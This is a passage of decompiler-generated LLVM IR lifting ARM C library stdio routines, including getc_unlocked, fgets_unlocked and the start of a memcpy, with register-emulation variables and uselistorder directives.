  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 5, 3, 4, 22, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 4, 15, 5, 6, 7, 35, 36, 8, 9, 10, 11, 12, 37, 38, 13, 14, 3, 16, 17, 19, 18, 0, 20, 21, 23, 22, 1, 24, 25, 26, 27, 39, 40, 28, 29, 31, 30, 2, 32, 33, 34 }
  uselistorder i32 92, { 0, 1, 2, 5, 3, 4, 6 }
  uselistorder i32 152, { 1, 3, 2, 4, 5, 8, 6, 9, 7, 10, 0, 11, 12, 14, 13, 15, 18, 16, 19, 17, 20 }
  uselistorder i32 129, { 7, 8, 9, 5, 6, 10, 11, 0, 1, 2, 3, 4, 12, 13 }
  uselistorder i32 -61504, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 34, 35, 36, 32, 33 }
  uselistorder i32 -61441, { 16, 17, 18, 19, 20, 21, 12, 13, 14, 15, 22, 23, 24, 25, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 31, 26, 27, 28, 29, 30 }
  uselistorder label %bb73, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_17124, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_170fc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_170e4, { 1, 0 }
  uselistorder label %bb71, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17064, { 1, 0 }
  uselistorder label %dec_label_pc_17058, { 1, 0 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %dec_label_pc_17048, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17030, { 1, 0 }
  uselistorder label %dec_label_pc_16fec, { 1, 0 }
  uselistorder label %dec_label_pc_16fdcthread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_16fb4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16f9c, { 1, 0 }
  uselistorder label %dec_label_pc_16f5c, { 1, 0 }
  uselistorder label %bb68, { 1, 0 }
  uselistorder label %dec_label_pc_16f4c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16f34, { 1, 0 }
  uselistorder label %dec_label_pc_16f08, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16ee0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16ec8, { 1, 0 }
  uselistorder label %dec_label_pc_16e80, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %dec_label_pc_16e70, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16e58, { 1, 0 }
  uselistorder label %dec_label_pc_16e24, { 1, 0 }
}

define i32 @function_17180(i32 %arg1) local_unnamed_addr {
dec_label_pc_17180:
  %v0_17180 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17180, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_17180
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_17180, %bb
  %v10_17190 = phi i32 [ %arg1, %dec_label_pc_17180 ], [ 0, %bb ]
  ret i32 %v10_17190

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_17194 = load i32, i32* @r4, align 4
  store i32 %v3_17194, i32* %stack_var_-12, align 4
  %v6_17194 = load i32, i32* @r5, align 4
  %v9_17194 = load i32, i32* @lr, align 4
  %v0_17198 = load i32, i32* @r0, align 4
  %v1_17198 = add i32 %v0_17198, 16
  %v2_17198 = inttoptr i32 %v1_17198 to i32*
  %v3_17198 = load i32, i32* %v2_17198, align 4
  store i32 %v3_17198, i32* %r2.global-to-local, align 4
  %v1_1719c = add i32 %v0_17198, 24
  %v2_1719c = inttoptr i32 %v1_1719c to i32*
  %v3_1719c = load i32, i32* %v2_1719c, align 4
  %v3_171a0 = icmp ult i32 %v3_17198, %v3_1719c
  store i32 %v0_17198, i32* @r4, align 4
  br i1 %v3_171a0, label %bb, label %dec_label_pc_171c0

bb:                                               ; preds = %entry
  %v2_171ac = inttoptr i32 %v3_17198 to i8*
  %v3_171ac = load i8, i8* %v2_171ac, align 1
  %v4_171ac = zext i8 %v3_171ac to i32
  store i32 %v4_171ac, i32* %r0.global-to-local, align 4
  %v6_171ac = add i32 %v3_17198, 1
  store i32 %v6_171ac, i32* %r2.global-to-local, align 4
  store i32 %v6_171ac, i32* %v2_17198, align 4
  br label %dec_label_pc_172ac

dec_label_pc_171c0:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* @r5, align 4
  %v1_171c0 = inttoptr i32 %v0_17198 to i16*
  %v2_171c0 = load i16, i16* %v1_171c0, align 2
  %v3_171c0 = zext i16 %v2_171c0 to i32
  %v1_171c4 = and i32 %v3_171c0, 131
  %tmp25 = icmp ugt i32 %v1_171c4, 128
  br i1 %tmp25, label %dec_label_pc_171e0, label %dec_label_pc_171d0

dec_label_pc_171d0:                               ; preds = %dec_label_pc_171c0
  store i32 128, i32* @r1, align 4
  %v0_171d4 = call i32 @__stdio_trans2r_o()
  store i32 %v0_171d4, i32* %r0.global-to-local, align 4
  %v2_171d8 = icmp eq i32 %v0_171d4, 0
  br i1 %v2_171d8, label %dec_label_pc_171d0.dec_label_pc_171e0_crit_edge, label %dec_label_pc_172a8

dec_label_pc_171d0.dec_label_pc_171e0_crit_edge:  ; preds = %dec_label_pc_171d0
  %v0_171e0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_171e0

dec_label_pc_171e0:                               ; preds = %dec_label_pc_171d0.dec_label_pc_171e0_crit_edge, %dec_label_pc_171c0
  %v2_17220 = phi i32 [ %v0_171e0.pre, %dec_label_pc_171d0.dec_label_pc_171e0_crit_edge ], [ %v0_17198, %dec_label_pc_171c0 ]
  %v1_171e0 = inttoptr i32 %v2_17220 to i16*
  %v2_171e0 = load i16, i16* %v1_171e0, align 2
  %v3_171e0 = zext i16 %v2_171e0 to i32
  store i32 %v3_171e0, i32* %r2.global-to-local, align 4
  %v1_171e4 = and i32 %v3_171e0, 2
  %v2_171e4 = icmp eq i32 %v1_171e4, 0
  br i1 %v2_171e4, label %dec_label_pc_17210, label %dec_label_pc_171ec

dec_label_pc_171ec:                               ; preds = %dec_label_pc_171e0
  %tmp26 = urem i16 %v2_171e0, 2
  %v1_171ec = zext i16 %tmp26 to i32
  %tmp22 = sub nsw i32 0, %v1_171ec
  %v4_171f0 = and i32 %tmp22, 4
  %v5_171f0 = add i32 %v4_171f0, %v2_17220
  %v1_171f4 = add i32 %v5_171f0, 36
  %v2_171f4 = inttoptr i32 %v1_171f4 to i8*
  %v3_171f4 = load i8, i8* %v2_171f4, align 1
  %v4_171f4 = zext i8 %v3_171f4 to i32
  %v1_171f8 = add nsw i32 %v3_171e0, -1
  store i32 %v1_171f8, i32* %r2.global-to-local, align 4
  store i32 %v4_171f4, i32* %r0.global-to-local, align 4
  %v2_17204 = add i32 %v2_17220, 40
  %v3_17204 = inttoptr i32 %v2_17204 to i32*
  store i32 0, i32* %v3_17204, align 4
  %v0_17208 = load i32, i32* %r2.global-to-local, align 4
  %v1_17208 = trunc i32 %v0_17208 to i16
  %v2_17208 = load i32, i32* @r4, align 4
  %v3_17208 = inttoptr i32 %v2_17208 to i16*
  store i16 %v1_17208, i16* %v3_17208, align 2
  br label %dec_label_pc_172ac

dec_label_pc_17210:                               ; preds = %dec_label_pc_171e0
  %v1_17210 = add i32 %v2_17220, 16
  %v1_17214 = inttoptr i32 %v1_17210 to i32*
  %v2_17214 = load i32, i32* %v1_17214, align 4
  store i32 %v2_17214, i32* @r1, align 4
  %v3_17214 = add i32 %v2_17220, 20
  %v4_17214 = inttoptr i32 %v3_17214 to i32*
  %v5_17214 = load i32, i32* %v4_17214, align 4
  %v9_17218 = icmp eq i32 %v5_17214, %v2_17214
  br i1 %v9_17218, label %dec_label_pc_17228, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_17210
  %v2_1721c = inttoptr i32 %v2_17214 to i8*
  %v3_1721c = load i8, i8* %v2_1721c, align 1
  %v4_1721c = zext i8 %v3_1721c to i32
  store i32 %v4_1721c, i32* %r0.global-to-local, align 4
  %v6_1721c = add i32 %v2_17214, 1
  store i32 %v6_1721c, i32* @r1, align 4
  store i32 %v6_1721c, i32* %v1_17214, align 4
  br label %dec_label_pc_172ac

dec_label_pc_17228:                               ; preds = %dec_label_pc_17210
  %v1_17228 = add i32 %v2_17220, 4
  %v2_17228 = inttoptr i32 %v1_17228 to i32*
  %v3_17228 = load i32, i32* %v2_17228, align 4
  %v7_1722c = icmp eq i32 %v3_17228, -2
  br i1 %v7_1722c, label %.thread7, label %dec_label_pc_17240

.thread7:                                         ; preds = %dec_label_pc_17228
  %v2_17230 = or i16 %v2_171e0, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_17230, i16* %v1_171e0, align 2
  br label %dec_label_pc_172ac

dec_label_pc_17240:                               ; preds = %dec_label_pc_17228
  %v1_17240 = and i32 %v3_171e0, 768
  %v2_17240 = icmp eq i32 %v1_17240, 0
  br i1 %v2_17240, label %.thread9, label %bb23

bb23:                                             ; preds = %dec_label_pc_17240
  %v1_17248 = load i32, i32* @r5, align 4
  %v3_17248 = add i32 %v1_17248, 76
  %v4_17248 = inttoptr i32 %v3_17248 to i32*
  %v5_17248 = load i32, i32* %v4_17248, align 4
  store i32 %v5_17248, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_17240, %bb23
  store i32 94800, i32* @lr, align 4
  %v1_1724c = xor i1 %v2_17240, true
  call void @__pseudo_cond_branch(i1 %v1_1724c, i32 ptrtoint (i32* @global_var_16de8.617 to i32))
  %v0_17250 = load i32, i32* @r4, align 4
  %v1_17250 = add i32 %v0_17250, 8
  store i32 %v1_17250, i32* %r2.global-to-local, align 4
  %v1_17254 = inttoptr i32 %v1_17250 to i32*
  %v2_17254 = load i32, i32* %v1_17254, align 4
  store i32 %v2_17254, i32* %r2.global-to-local, align 4
  %v3_17254 = add i32 %v0_17250, 12
  %v4_17254 = inttoptr i32 %v3_17254 to i32*
  %v5_17254 = load i32, i32* %v4_17254, align 4
  %v9_17258 = icmp eq i32 %v5_17254, %v2_17254
  br i1 %v9_17258, label %dec_label_pc_1728c, label %dec_label_pc_17260

dec_label_pc_17260:                               ; preds = %.thread9
  %v2_17260 = add i32 %v0_17250, 24
  %v3_17260 = inttoptr i32 %v2_17260 to i32*
  store i32 %v2_17254, i32* %v3_17260, align 4
  %v0_17264 = load i32, i32* @r4, align 4
  store i32 %v0_17264, i32* %r0.global-to-local, align 4
  %v2_17268 = call i32 @__stdio_rfill(i32 %v0_17264)
  store i32 %v2_17268, i32* %r0.global-to-local, align 4
  %v2_1726c = icmp eq i32 %v2_17268, 0
  br i1 %v2_1726c, label %dec_label_pc_172a8, label %dec_label_pc_17274

dec_label_pc_17274:                               ; preds = %dec_label_pc_17260
  %v0_17274 = load i32, i32* @r4, align 4
  %v1_17274 = add i32 %v0_17274, 20
  %v2_17274 = inttoptr i32 %v1_17274 to i32*
  %v3_17274 = load i32, i32* %v2_17274, align 4
  %v2_17278 = add i32 %v0_17274, 24
  %v3_17278 = inttoptr i32 %v2_17278 to i32*
  store i32 %v3_17274, i32* %v3_17278, align 4
  %v0_1727c = load i32, i32* @r4, align 4
  %v1_1727c = add i32 %v0_1727c, 16
  %v2_1727c = inttoptr i32 %v1_1727c to i32*
  %v3_1727c = load i32, i32* %v2_1727c, align 4
  %v1_17280 = inttoptr i32 %v3_1727c to i8*
  %v2_17280 = load i8, i8* %v1_17280, align 1
  %v3_17280 = zext i8 %v2_17280 to i32
  store i32 %v3_17280, i32* %r0.global-to-local, align 4
  %v5_17280 = add i32 %v3_1727c, 1
  store i32 %v5_17280, i32* %v2_1727c, align 4
  br label %dec_label_pc_172ac

dec_label_pc_1728c:                               ; preds = %.thread9
  %v1_1728c = inttoptr i32 %v0_17250 to i16*
  store i32 %v0_17250, i32* %r0.global-to-local, align 4
  %v2_17290 = ptrtoint i8* %stack_var_-17 to i32
  store i32 %v2_17290, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_17298 = call i32 @__stdio_READ(i16* %v1_1728c, i32 %v2_17290, i32 1)
  store i32 %v5_17298, i32* %r0.global-to-local, align 4
  %v2_1729c = icmp eq i32 %v5_17298, 0
  br i1 %v2_1729c, label %dec_label_pc_172a8, label %bb24

bb24:                                             ; preds = %dec_label_pc_1728c
  %v4_172a0 = load i8, i8* %stack_var_-17, align 1
  %v5_172a0 = sext i8 %v4_172a0 to i32
  store i32 %v5_172a0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_172ac

dec_label_pc_172a8:                               ; preds = %dec_label_pc_1728c, %dec_label_pc_171d0, %dec_label_pc_17260
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_172ac

dec_label_pc_172ac:                               ; preds = %bb, %.thread7, %bb24, %.thread4, %dec_label_pc_17274, %dec_label_pc_171ec, %dec_label_pc_172a8
  %v2_172b0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_172b0, i32* @r4, align 4
  store i32 %v6_17194, i32* @r5, align 4
  store i32 %v9_17194, i32* @lr, align 4
  %v1_172b4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_172b4

; uselistorder directives
  uselistorder i32 %v2_17214, { 1, 0, 2, 3 }
  uselistorder i32 %v2_17220, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_17198, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 13, 12 }
  uselistorder i32 768, { 2, 0, 3, 1, 4 }
  uselistorder label %dec_label_pc_172ac, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_172a8, { 0, 2, 1 }
  uselistorder label %.thread9, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v9_172c0 = load i32, i32* @r6, align 4
  %v12_172c0 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_172c4 = icmp eq i32 %arg2, 0
  store i1 %v2_172c4, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_1734c, label %dec_label_pc_17334.preheader

dec_label_pc_17334.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r5, align 4
  %v1_173342 = add i32 %arg2, -1
  store i32 %v1_173342, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_173348 = icmp eq i32 %arg2, 1
  store i1 %v7_173348, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_173348, label %dec_label_pc_1733c, label %dec_label_pc_172e0

dec_label_pc_172e0:                               ; preds = %dec_label_pc_17334.preheader, %dec_label_pc_17334.backedge.dec_label_pc_172e0_crit_edge
  %v0_17304 = phi i32 [ %v0_172e0.pre, %dec_label_pc_17334.backedge.dec_label_pc_172e0_crit_edge ], [ %arg3, %dec_label_pc_17334.preheader ]
  %v1_172e0 = add i32 %v0_17304, 16
  %v2_172e0 = inttoptr i32 %v1_172e0 to i32*
  %v3_172e0 = load i32, i32* %v2_172e0, align 4
  store i32 %v3_172e0, i32* %r2.global-to-local, align 4
  %v1_172e4 = add i32 %v0_17304, 24
  %v2_172e4 = inttoptr i32 %v1_172e4 to i32*
  %v3_172e4 = load i32, i32* %v2_172e4, align 4
  store i32 %v3_172e4, i32* %r3.global-to-local, align 4
  %v3_172e8 = icmp uge i32 %v3_172e0, %v3_172e4
  store i1 %v3_172e8, i1* %cpsr_c.global-to-local, align 1
  %v9_172e8 = icmp eq i32 %v3_172e0, %v3_172e4
  store i1 %v9_172e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_172e8, label %dec_label_pc_17304, label %dec_label_pc_172f0

dec_label_pc_172f0:                               ; preds = %dec_label_pc_172e0
  %v1_172f0 = inttoptr i32 %v3_172e0 to i8*
  %v2_172f0 = load i8, i8* %v1_172f0, align 1
  %v3_172f0 = zext i8 %v2_172f0 to i32
  store i32 %v3_172f0, i32* %r3.global-to-local, align 4
  %v5_172f0 = add i32 %v3_172e0, 1
  store i32 %v5_172f0, i32* %r2.global-to-local, align 4
  %v2_172f4 = load i32, i32* @r5, align 4
  %v3_172f4 = inttoptr i32 %v2_172f4 to i8*
  store i8 %v2_172f0, i8* %v3_172f4, align 1
  %v4_172f4 = load i32, i32* @r5, align 4
  %v5_172f4 = add i32 %v4_172f4, 1
  store i32 %v5_172f4, i32* @r5, align 4
  %v0_172f8 = load i32, i32* %r3.global-to-local, align 4
  %v2_172f8 = icmp ugt i32 %v0_172f8, 9
  store i1 %v2_172f8, i1* %cpsr_c.global-to-local, align 1
  %v7_172f8 = icmp eq i32 %v0_172f8, 10
  store i1 %v7_172f8, i1* %cpsr_z.global-to-local, align 1
  %v0_172fc = load i32, i32* %r2.global-to-local, align 4
  %v1_172fc = load i32, i32* @r4, align 4
  %v2_172fc = add i32 %v1_172fc, 16
  %v3_172fc = inttoptr i32 %v2_172fc to i32*
  store i32 %v0_172fc, i32* %v3_172fc, align 4
  br i1 %v7_172f8, label %dec_label_pc_1733c, label %dec_label_pc_17334.backedge

dec_label_pc_17304:                               ; preds = %dec_label_pc_172e0
  %v1_17304 = inttoptr i32 %v0_17304 to i16*
  %v3_17308 = call i32 @getc_unlocked(i16* %v1_17304)
  %v3_1730c = icmp eq i32 %v3_17308, -1
  store i1 %v3_1730c, i1* %cpsr_c.global-to-local, align 1
  %v8_1730c = icmp eq i32 %v3_17308, -1
  store i1 %v8_1730c, i1* %cpsr_z.global-to-local, align 1
  %v1_17310 = urem i32 %v3_17308, 256
  store i32 %v1_17310, i32* %r3.global-to-local, align 4
  br i1 %v3_1730c, label %dec_label_pc_17318, label %dec_label_pc_17330

dec_label_pc_17318:                               ; preds = %dec_label_pc_17304
  %v0_17318 = load i32, i32* @r4, align 4
  %v1_17318 = inttoptr i32 %v0_17318 to i16*
  %v2_17318 = load i16, i16* %v1_17318, align 2
  %v3_17318 = zext i16 %v2_17318 to i32
  store i32 %v3_17318, i32* %r3.global-to-local, align 4
  %v1_1731c = and i32 %v3_17318, 8
  %v2_1731c = icmp eq i32 %v1_1731c, 0
  store i1 %v2_1731c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1731c, label %dec_label_pc_1733c, label %dec_label_pc_1734c

dec_label_pc_17330:                               ; preds = %dec_label_pc_17304
  %v1_17328 = trunc i32 %v3_17308 to i8
  %v2_17328 = load i32, i32* @r5, align 4
  %v3_17328 = inttoptr i32 %v2_17328 to i8*
  store i8 %v1_17328, i8* %v3_17328, align 1
  %v4_17328 = load i32, i32* @r5, align 4
  %v5_17328 = add i32 %v4_17328, 1
  store i32 %v5_17328, i32* @r5, align 4
  %v0_1732c = load i32, i32* %r3.global-to-local, align 4
  %v2_1732c = icmp ugt i32 %v0_1732c, 9
  store i1 %v2_1732c, i1* %cpsr_c.global-to-local, align 1
  %v7_1732c = icmp eq i32 %v0_1732c, 10
  store i1 %v7_1732c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1732c, label %dec_label_pc_1733c, label %dec_label_pc_17334.backedge

dec_label_pc_17334.backedge:                      ; preds = %dec_label_pc_17330, %dec_label_pc_172f0
  %v0_17334 = load i32, i32* @r6, align 4
  %v1_17334 = add i32 %v0_17334, -1
  store i32 %v1_17334, i32* @r6, align 4
  %v2_17334 = icmp ne i32 %v0_17334, 0
  store i1 %v2_17334, i1* %cpsr_c.global-to-local, align 1
  %v7_17334 = icmp eq i32 %v0_17334, 1
  store i1 %v7_17334, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17334, label %dec_label_pc_1733c, label %dec_label_pc_17334.backedge.dec_label_pc_172e0_crit_edge

dec_label_pc_17334.backedge.dec_label_pc_172e0_crit_edge: ; preds = %dec_label_pc_17334.backedge
  %v0_172e0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_172e0

dec_label_pc_1733c:                               ; preds = %dec_label_pc_17330, %dec_label_pc_17334.backedge, %dec_label_pc_172f0, %dec_label_pc_17334.preheader, %dec_label_pc_17318
  %v0_1733c = load i32, i32* @r5, align 4
  %v1_1733c = load i32, i32* @r7, align 4
  %v3_1733c = icmp uge i32 %v0_1733c, %v1_1733c
  store i1 %v3_1733c, i1* %cpsr_c.global-to-local, align 1
  %v9_1733c = icmp eq i32 %v0_1733c, %v1_1733c
  store i1 %v9_1733c, i1* %cpsr_z.global-to-local, align 1
  %v2_17340 = xor i1 %v9_1733c, true
  %v3_17340 = and i1 %v3_1733c, %v2_17340
  br i1 %v3_17340, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_1733c
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_17344 = inttoptr i32 %v0_1733c to i8*
  store i8 0, i8* %v7_17344, align 1
  %v0_17348.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_17348.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_1733c, %bb
  %v1_17348 = phi i1 [ %v1_17348.pre, %bb ], [ %v9_1733c, %dec_label_pc_1733c ]
  %v0_17348 = phi i1 [ %v0_17348.pre, %bb ], [ %v3_1733c, %dec_label_pc_1733c ]
  %v2_17348 = xor i1 %v1_17348, true
  %v3_17348 = and i1 %v0_17348, %v2_17348
  br i1 %v3_17348, label %.dec_label_pc_17350_crit_edge, label %dec_label_pc_1734c

.dec_label_pc_17350_crit_edge:                    ; preds = %.thread14
  %v0_17350.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_17350

dec_label_pc_1734c:                               ; preds = %entry, %dec_label_pc_17318, %.thread14
  br label %dec_label_pc_17350

dec_label_pc_17350:                               ; preds = %.dec_label_pc_17350_crit_edge, %dec_label_pc_1734c
  %v0_17350 = phi i32 [ %v0_17350.pre, %.dec_label_pc_17350_crit_edge ], [ 0, %dec_label_pc_1734c ]
  store i32 %v9_172c0, i32* @r6, align 4
  store i32 %v12_172c0, i32* @r7, align 4
  ret i32 %v0_17350

; uselistorder directives
  uselistorder i1 %v9_1733c, { 1, 0, 2 }
  uselistorder i32 %v1_1733c, { 1, 0 }
  uselistorder i32 %v0_1733c, { 0, 2, 1 }
  uselistorder i32 %v0_17334, { 2, 0, 1 }
  uselistorder i32 %v0_1732c, { 1, 0 }
  uselistorder i32 %v3_17308, { 2, 1, 0, 3 }
  uselistorder i32 %v0_172f8, { 1, 0 }
  uselistorder i32 %v3_172e0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_17304, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 7, 3, 4, 5, 6, 0, 8 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_17350, { 1, 0 }
  uselistorder label %dec_label_pc_1734c, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_1733c, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_172e0, { 1, 0 }
}

define i32 @_memcpy() local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_17360 = load i32, i32* @r1, align 4
  %v1_17360 = load i32, i32* @r0, align 4
  %v2_17360 = sub i32 %v0_17360, %v1_17360
  %v3_17360 = icmp ult i32 %v0_17360, %v1_17360
  %v4_17360 = xor i32 %v1_17360, %v0_17360
  %v5_17360 = xor i32 %v2_17360, %v0_17360
  %v6_17360 = and i32 %v5_17360, %v4_17360
  %v7_17360 = icmp slt i32 %v6_17360, 0
  store i1 %v7_17360, i1* %cpsr_v.global-to-local, align 1
  %v8_17360 = icmp slt i32 %v2_17360, 0
  store i1 %v8_17360, i1* %cpsr_n.global-to-local, align 1
  %v9_17360 = icmp eq i32 %v0_17360, %v1_17360
  store i1 %v9_17360, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_17360, label %dec_label_pc_175b4, label %dec_label_pc_17368

dec_label_pc_17368:                               ; preds = %entry
  br i1 %v9_17360, label %.thread130, label %bb

.thread130:                                       ; preds = %bb153, %.thread129, %bb150, %dec_label_pc_17368
  %merge = phi i32 [ %v0_17360, %dec_label_pc_17368 ], [ %v2_17648, %bb150 ], [ %v11_17664, %bb153 ], [ %v7_17664, %.thread129 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_17368
  %v5_1736c = inttoptr i32 %v1_17360 to i8*
  store i8* %v5_1736c, i8** %stack_var_-8, align 4
  %v8_1736c = load i32, i32* @lr, align 4
  %v0_17370 = load i32, i32* @r2, align 4
  %v2_17370 = add i32 %v0_17370, -4
  store i32 %v2_17370, i32* %r2.global-to-local, align 4
  %v4_17370 = sub i32 3, %v0_17370
  %v5_17370 = and i32 %v4_17370, %v0_17370
  %v6_17370 = icmp slt i32 %v5_17370, 0
  store i1 %v6_17370, i1* %cpsr_v.global-to-local, align 1
  %v7_17370 = icmp slt i32 %v2_17370, 0
  store i1 %v7_17370, i1* %cpsr_n.global-to-local, align 1
  %v8_17370 = icmp eq i32 %v0_17370, 4
  store i1 %v8_17370, i1* %cpsr_z.global-to-local, align 1
  %v5_17374 = icmp slt i32 %v0_17370, 4
  br i1 %v5_17374, label %bb140, label %dec_label_pc_17378

dec_label_pc_17378:                               ; preds = %bb
  %v1_17378 = urem i32 %v1_17360, 4
  store i32 %v1_17378, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_17378 = icmp eq i32 %v1_17378, 0
  store i1 %v2_17378, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17378, label %dec_label_pc_17380, label %dec_label_pc_1742c

dec_label_pc_17380:                               ; preds = %dec_label_pc_17378
  %v1_17380 = urem i32 %v0_17360, 4
  store i32 %v1_17380, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_17380 = icmp eq i32 %v1_17380, 0
  store i1 %v2_17380, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_17360 to i2
  br i1 %v2_17380, label %dec_label_pc_17388, label %dec_label_pc_1745c

dec_label_pc_17388:                               ; preds = %dec_label_pc_17380, %dec_label_pc_17454
  %v0_173a094 = phi i32 [ %v1_17360, %dec_label_pc_17380 ], [ %v0_1757c77, %dec_label_pc_17454 ]
  %v0_1739c93 = phi i32 [ %v0_17360, %dec_label_pc_17380 ], [ %v0_17454, %dec_label_pc_17454 ]
  %v0_17388 = phi i32 [ %v2_17370, %dec_label_pc_17380 ], [ %v2_1744c, %dec_label_pc_17454 ]
  %v1_17388 = add i32 %v0_17388, -8
  store i32 %v1_17388, i32* %r2.global-to-local, align 4
  %v3_17388 = sub i32 7, %v0_17388
  %v4_17388 = and i32 %v3_17388, %v0_17388
  %v5_17388 = icmp slt i32 %v4_17388, 0
  store i1 %v5_17388, i1* %cpsr_v.global-to-local, align 1
  %v6_17388 = icmp slt i32 %v1_17388, 0
  store i1 %v6_17388, i1* %cpsr_n.global-to-local, align 1
  %v7_17388 = icmp eq i32 %v0_17388, 8
  store i1 %v7_17388, i1* %cpsr_z.global-to-local, align 1
  %v2_1738c = xor i1 %v6_17388, %v5_17388
  br i1 %v2_1738c, label %dec_label_pc_173dc, label %dec_label_pc_17390

dec_label_pc_17390:                               ; preds = %dec_label_pc_17388
  %v1_17390 = add i32 %v0_17388, -28
  store i32 %v1_17390, i32* %r2.global-to-local, align 4
  %v3_17390 = sub i32 27, %v0_17388
  %v4_17390 = and i32 %v3_17390, %v1_17388
  %v5_17390 = icmp slt i32 %v4_17390, 0
  store i1 %v5_17390, i1* %cpsr_v.global-to-local, align 1
  %v6_17390 = icmp slt i32 %v1_17390, 0
  store i1 %v6_17390, i1* %cpsr_n.global-to-local, align 1
